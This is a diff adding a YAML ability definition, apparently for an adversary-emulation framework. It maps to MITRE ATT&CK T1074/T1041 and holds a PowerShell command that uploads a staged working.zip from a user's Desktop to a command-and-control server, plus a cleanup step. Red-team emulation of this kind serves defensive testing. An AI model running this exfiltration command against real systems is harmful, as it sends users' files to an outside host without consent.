@@ -1,0 +1,18 @@
+---
+- id: 2d18c8ec-4593-49dc-9bf4-11d0673d6ae6
+  name: 9.B.8 - Data from staged file (T1074) and Exfiltration over C2 Channel (T1041)
+  description: Copy a target file from a remote file share through the existing C2 channel
+  tactic: exfiltration
+  technique:
+    attack_id: T1041
+    name: Exfiltration Over Command and Control Channel
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Import-Module .\upload.ps1 -Verbose -Force;
+          Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\Desktop\working.zip" -Uri "#{server}/file/upload";
+        cleanup: |
+          remove-item upload.ps1 -Force
+        payload: upload.ps1
+
